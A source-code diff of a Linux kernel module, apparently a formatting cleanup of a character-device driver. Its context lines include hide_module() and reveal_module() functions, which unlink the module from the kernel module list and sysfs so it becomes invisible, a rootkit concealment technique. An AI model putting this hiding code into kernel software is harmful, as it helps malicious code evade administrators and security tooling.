@@ -37,9 +37,10 @@ int modHidden = 0;
 static struct list_head *modList;
 
 void hide_module(void){
-        if(modHidden){
+	
+        if (modHidden)
                 return;
-        }
+	
 	modList = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
         kobject_del(&THIS_MODULE->mkobj.kobj);
@@ -48,33 +49,37 @@ void hide_module(void){
         modHidden = 1;
 }
 
-void reveal_module(void){
-	if(modHidden == 0){
+void reveal_module(void) {
+	
+	if (modHidden == 0) {
 		return;
 	}
+	
 	list_add(&THIS_MODULE->list, modList);
         modHidden = 0;
 }
 
 static int __init register_device(void)
 {
-  /*próba inicjalizacji*/
   //printk(KERN_INFO "CharDev: Initializing char device...\n");
   major_num = register_chrdev( 0, DEV_NAME, &fops );
-  if(major_num<0) //error gdy cos się zepsuje
+	
+  if (major_num < 0)
   {
     return major_num;
   }
 
   dev_class = class_create(THIS_MODULE, CLASS_NAME);
-  if(IS_ERR(dev_class))
+	
+  if (IS_ERR(dev_class))
   {
     unregister_chrdev(major_num, DEV_NAME);
     return PTR_ERR(dev_class);
   }
 
   dev_struct = device_create(dev_class, NULL, MKDEV(major_num, 0), NULL, DEV_NAME);
-  if(IS_ERR(dev_struct))
+	
+  if (IS_ERR(dev_struct))
   {
     class_destroy(dev_class);
     unregister_chrdev(major_num, DEV_NAME);
@@ -121,7 +126,7 @@ static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, lof
 static int dev_release(struct inode *inodep, struct file *filep)
 {
    return 0;
- }
+}
 
  module_init(register_device);
  module_exit(unregister_device);
